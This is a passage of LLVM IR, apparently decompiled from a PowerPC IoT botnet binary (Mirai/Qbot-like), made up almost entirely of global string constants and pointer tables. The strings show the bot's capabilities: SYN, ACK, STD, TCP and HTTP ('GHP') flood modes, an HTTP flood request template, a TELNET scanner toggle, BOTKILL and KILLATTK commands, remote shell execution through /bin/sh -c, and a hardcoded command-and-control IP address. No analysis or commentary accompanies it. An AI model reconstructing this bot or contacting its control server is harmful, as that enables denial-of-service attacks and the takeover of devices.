inbounds ([14 x i8], [14 x i8]* @global_var_10017254.498, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017264.499, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017270.500, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001727c.501, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017284.502, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001728c.503, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017294.504, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001729c.505, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100172a4.506, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100172ac.507, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100172bc.508, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100172c4.509, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100172d0.510, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100172d8.511, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100172e4.512, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100172f0.513, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100172f8.514, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017304.515, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001730c.516, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017314.517, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017320.518, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001732c.519, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10017338.520, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017348.521, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017354.522, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017360.523, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1001736c.524, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001737c.525, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017388.526, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017394.527, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100173a0.528, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100173a8.529, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173b0.530, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100173bc.531, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100173c4.532, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173d0.533, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173dc.534, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173e8.535, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173f4.536, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017400.537, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001740c.538, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017418.539, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017424.540, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017430.541, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001743c.542, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017448.543, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017454.544, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017460.545, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001746c.546, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017478.547, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017484.548, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017490.549, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001749c.550, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174a8.551, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100174b4.552, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174c0.553, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174cc.554, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100174d8.555, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100174e8.556, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174f4.557, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017500.558, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001750c.559, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017518.560, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017524.561, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017530.562, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001753c.563, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017548.564, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017554.565, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017560.566, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001756c.567, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017578.568, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017588.569, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017598.570, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100175a4.571, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100175b4.572, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100175c4.573, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100175d4.574, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_100175e0.575, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100175f8.576, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017604.577, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017610.578, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001761c.579, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017628.580, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017638.581, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017644.582, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017654.583, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017660.584, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001766c.585, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017678.586, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017688.587, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017694.588, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100176a4.589, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100176b0.590, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100176bc.591, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100176c8.592, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100176d4.593, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100176e0.594, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100176f0.595, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100176fc.596, i32 0, i32 0)]
@global_var_10018c94.612 = constant i32 570425344
@global_var_10018c98.613 = constant [6 x i8] c"close\00"
@global_var_10018ca0.614 = constant [11 x i8] c"keep-alive\00"
@global_var_10018cac.615 = constant [7 x i8] c"accept\00"
@global_var_1002b140.619 = global [105 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100149d8.331, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_10014a4c.332, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014abc.333, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014b30.334, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10014ba4.335, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_10014c20.336, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10014c90.337, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014d0c.338, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @global_var_10014d80.339, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10014de8.340, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10014e64.341, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @global_var_10014eb0.342, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_10014f2c.343, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014f9c.344, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_10015010.345, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015040.346, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_100150bc.347, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1001512c.348, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015174.349, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_100151f0.350, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1001526c.351, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_100152e8.352, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_10015334.353, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @global_var_100153a0.354, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_100153f0.355, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1001546c.356, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100154e8.357, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015534.358, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_100155b0.359, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1001562c.360, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @global_var_100156a8.361, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @global_var_100156ec.362, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10015730.363, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100157a4.364, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_10015818.365, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10015890.366, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_10015904.367, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015954.368, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100159d0.369, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015a44.370, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @global_var_10015ac0.371, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10015b4c.372, i32 0, i32 0), i8* getelementptr inbounds ([267 x i8], [267 x i8]* @global_var_10015b98.373, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_10015ca4.374, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10015ce4.375, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_10015d24.376, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_10015db4.377, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_10015dec.378, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_10015e0c.379, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_10015e24.380, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_10015e7c.381, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10015f1c.382, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10015f70.383, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_10015fe4.384, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_10016024.385, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_100160dc.386, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10016130.387, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10016188.388, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_100161e0.389, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10016220.390, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10016268.391, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_100162c0.392, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_1001632c.393, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10016384.394, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_100163d4.395, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_100163f8.396, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10016454.397, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_10016464.398, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_10016494.399, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_100164b8.400, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_100164dc.401, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_100164f8.402, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_10016538.403, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_100165c4.404, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1001660c.405, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10016654.406, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1001669c.407, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_100166e4.408, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_10016738.409, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_10016788.410, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_100167f4.411, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10016848.412, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_100168a4.413, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_10016900.414, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10016964.415, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_100169c0.416, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10016a1c.417, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_10016a78.418, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10016ad8.419, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_10016b20.420, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10016bb8.421, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10016c04.422, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_10016c50.423, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10016ca0.424, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_10016ce8.425, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_10016d3c.426, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_10016d8c.427, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10016dd4.428, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10016e20.429, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10016e6c.430, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10016eb4.431, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10016f04.432, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_10016f54.433, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_10016f88.434, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_10016fbc.435, i32 0, i32 0)]
@global_var_10018cc0.620 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_10009f20.621 = constant i32 939524096
@global_var_10009fd8.622 = constant [3 x i8] c"8`\00"
@global_var_10018d00.623 = constant [4 x i8] c"all\00"
@global_var_10018d04.624 = constant i32 738197504
@global_var_10018d08.625 = constant [4 x i8] c"syn\00"
@global_var_10018d0c.626 = constant [4 x i8] c"rst\00"
@global_var_10018d10.627 = constant [4 x i8] c"fin\00"
@global_var_10018d14.628 = constant [4 x i8] c"ack\00"
@global_var_10018d18.629 = constant [4 x i8] c"psh\00"
@global_var_10018d1c.630 = constant [4 x i8] c"std\00"
@global_var_1000a734.631 = constant [3 x i8] c"8`\00"
@global_var_1000a75c.632 = constant [3 x i8] c"8`\00"
@global_var_1000a764.633 = constant i32 939524096
@global_var_10018d20.634 = constant [6 x i8] c"PONG!\00"
@global_var_1000a7ec.635 = constant i32 1207961892
@global_var_10018d28.636 = constant [7 x i8] c"TELNET\00"
@global_var_10018d30.637 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_1000a83c.638 = constant i32 1207961812
@global_var_10018d40.639 = constant [4 x i8] c"OFF\00"
@global_var_1002b928.640 = local_unnamed_addr global i32 0
@global_var_10018d44.641 = constant [13 x i8] c"[TELNET] OFF\00"
@global_var_10018d54.642 = constant [3 x i8] c"ON\00"
@global_var_10018d58.643 = constant [12 x i8] c"[TELNET] ON\00"
@global_var_1000a944.644 = constant [3 x i8] c"8`\00"
@global_var_10018d64.645 = constant [8 x i8] c"BOTKILL\00"
@global_var_10018d6c.646 = constant [13 x i8] c"Killing - %s\00"
@global_var_1000a9c0.647 = constant [3 x i8] c"8`\00"
@global_var_10018d7c.648 = constant [4 x i8] c"TCP\00"
@global_var_1000abd8.649 = constant [3 x i8] c"8`\00"
@global_var_1000abe0.650 = constant [3 x i8] c"8`\00"
@global_var_1000ac38.651 = constant [3 x i8] c"8`\00"
@global_var_10018d80.652 = constant [4 x i8] c"STD\00"
@global_var_1000ad58.653 = constant [3 x i8] c"8`\00"
@global_var_1000ad60.654 = constant [3 x i8] c"8`\00"
@global_var_1000ada8.655 = constant [3 x i8] c"8`\00"
@global_var_10018d84.656 = constant [4 x i8] c"GHP\00"
@global_var_1000aed4.657 = constant [3 x i8] c"8`\00"
@global_var_1000aedc.658 = constant [3 x i8] c"8`\00"
@global_var_1000afac.659 = constant [3 x i8] c"8`\00"
@global_var_10018d88.660 = constant [9 x i8] c"KILLATTK\00"
@global_var_10018d94.661 = constant [15 x i8] c"URSTRAITKANCER\00"
@global_var_1002b8b8.662 = local_unnamed_addr global i32 -1
@global_var_100146a8.663 = constant [16 x i8] c"185.101.107.128\00"
@global_var_1002b8a0.664 = global [16 x i8]* @global_var_100146a8.663
@global_var_1002b8a4.665 = local_unnamed_addr global i32 66
@global_var_10018da4.666 = constant [8 x i8] c"8.8.8.8\00"
@global_var_10018dac.667 = constant [16 x i8] c"/proc/net/route\00"
@global_var_10018dbc.668 = constant [11 x i8] c"\0900000000\09\00"
@global_var_1000b4fc.669 = constant i32 939524096
@global_var_1002b908.670 = global i32 0
@global_var_1000b550.671 = constant i32 1207959564
@global_var_10018dc8.672 = constant [8 x i8] c"POWERPC\00"
@global_var_10018dd0.673 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_10018de0.674 = constant [7 x i8] c"SERVER\00"
@global_var_10018de8.675 = constant [7 x i8] c"ROUTER\00"
@global_var_10018df0.676 = constant i32 0
@global_var_10018df4.677 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_1002b8b4.678 = local_unnamed_addr global i32 1
@global_var_1000b714.679 = constant [3 x i8] c"8`\00"
@global_var_1000b734.680 = constant [3 x i8] c"8`\00"
@global_var_1000b758.681 = constant i32 1207962669
@global_var_1000b784.682 = constant [3 x i8] c"8`\00"
@global_var_1000b7b8.683 = constant i32 1207963413
@global_var_10018e08.684 = constant i32 788529152
@global_var_1000b7c8.685 = constant [3 x i8] c"8`\00"
@global_var_1000b7d4.686 = constant i32 1207959556
@global_var_10018e0c.687 = constant [43 x i8] c"[ %s CONNECTED ] [ %s: ] [ Arch Type: %s ]\00"
@global_var_1000b848.688 = constant i32 939524096
@global_var_10018e38.689 = constant [5 x i8] c"PONG\00"
@global_var_1000bb8c.690 = constant i32 1207960708
@global_var_10018e40.691 = constant [4 x i8] c"DUP\00"
@global_var_10018e44.692 = constant [5 x i8] c"MOVE\00"
@global_var_10018e4c.693 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 1912602624
@global_var_1000be54.695 = constant [3 x i8] c"8`\00"
@global_var_1000be84.696 = constant [3 x i8] c"8`\00"
@global_var_1000be8c.697 = constant i32 939524097
@global_var_10018e58.698 = constant i32 536870912
@global_var_1000c0c8.699 = constant i32 1207959564
@global_var_1000c748.700 = constant i32 939524118
@global_var_1002b8c0 = external local_unnamed_addr global i32
@global_var_1002b958.706 = global i32 0
@global_var_1000c9f0.707 = constant [3 x i8] c" c\00"
@global_var_1000ca0c.708 = constant [3 x i8] c" c\00"
@global_var_1001945c.709 = constant i32 0
@global_var_1002b574.710 = global i32 0
@global_var_1002b58c.711 = global i32 0
@global_var_1002b8e0.712 = global i32* bitcast (i16* @global_var_1002b5a4.703 to i32*)
@global_var_1000cca8.713 = constant i32 1207961084
@global_var_1000cdd0.714 = constant i32 1207960764
@global_var_10019490.715 = constant i32 269488136
@global_var_10019474.716 = constant [6 x i8] c"(nil)\00"
@global_var_1001947c.717 = constant [7 x i8] c"(null)\00"
@global_var_10019484.718 = constant i32 721431808
@global_var_1000d22c.719 = constant i32 939524096
@global_var_10019510.720 = constant i32 65793
@global_var_100194f8.721 = constant i32 524293
@global_var_100194f0.722 = constant [8 x i8] c" +0-#'I\00"
@global_var_10019498.723 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_100194d8.724 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_100194cc.725 = constant i32 67343
@global_var_100194cb.726 = constant i32 50331911
@global_var_100194bc.727 = constant i32 268435461
@global_var_100194ac.728 = constant i32 520093701
@global_var_1000dbd0.729 = constant i32 939589631
@global_var_1000dc84.730 = constant i32 939524118
@global_var_1001952c.731 = constant [8 x i8] c"Success\00"
@global_var_1001951c.732 = constant [15 x i8] c"Unknown error \00"
@global_var_1001a266.733 = constant i32 1
@global_var_1002b8f4.734 = local_unnamed_addr global i32* @global_var_1001a266.733
@global_var_1002b938.735 = global i32 0
@global_var_1001a110.736 = constant [15 x i8] c"Resolver error\00"
@global_var_1001a090.737 = constant [8 x i8] c"Error 0\00"
@global_var_1001a098.738 = constant [13 x i8] c"Unknown host\00"
@global_var_1001a0a8.739 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_1001a0c4.740 = constant [21 x i8] c"Unknown server error\00"
@global_var_1001a0dc.741 = constant [32 x i8] c"No address associated with name\00"
@global_var_1001a0fc.742 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001a090.737, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001a098.738, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1001a0a8.739, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1001a0c4.740, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1001a0dc.741, i32 0, i32 0)]
@global_var_1001a120.743 = constant [3 x i8] c": \00"
@global_var_1001a122.744 = constant i32 0
@global_var_1001a088.745 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_10031998.746 = global i32 0
@global_var_10031b74.747 = global i32 0
@global_var_100319a8.748 = global i32 0
@global_var_1002b870.749 = global i32 0
@global_var_10010040.750 = constant [3 x i8] c"8`\00"
@global_var_1002b964.751 = local_unnamed_addr global i32 0
@global_var_10031c60.752 = global i32 0
@global_var_1000ea84.753 = constant [3 x i8] c"8`\00"
@global_var_1000eb68.754 = constant i32 939524098
@global_var_1000eba8.755 = constant [3 x i8] c"8`\00"
@global_var_1000edb0.756 = constant i32 939524118
@global_var_1000ee38.757 = constant i32 939524118
@global_var_10031bb8.758 = global i32 0
@global_var_10031b88.759 = global i32 0
@global_var_1002b8e8 = external global i32
@global_var_1002b948.762 = local_unnamed_addr global i32 0
@global_var_10031c38.763 = global i32 0
@global_var_1000f094.764 = constant i32 939524108
@global_var_1000f12c.765 = constant [3 x i8] c"8`\00"
@global_var_1000f334.766 = constant i32 1207959640
@global_var_1000f370.767 = constant i32 1207959580
@global_var_1002b7a0.768 = global i32 0
@global_var_1002b7b8 = external global i32
@global_var_1002b7d8.770 = global i32 -1726662223
@global_var_1002b7c0.771 = local_unnamed_addr global i32* @global_var_1002b7d8.770
@global_var_1002b7bc.772 = global i32* @global_var_1002b7d8.770
@global_var_1001a124.773 = constant i32 0
@global_var_1000f688.774 = constant i32 939524118
@global_var_1000f8ac.775 = constant i32 939524096
@global_var_1001a14c.776 = constant [8 x i8] c"/bin/sh\00"
@global_var_1001a154.777 = constant [3 x i8] c"sh\00"
@global_var_1001a158.778 = constant [3 x i8] c"-c\00"
@global_var_1000f9dc.779 = constant [3 x i8] c"8`\00"
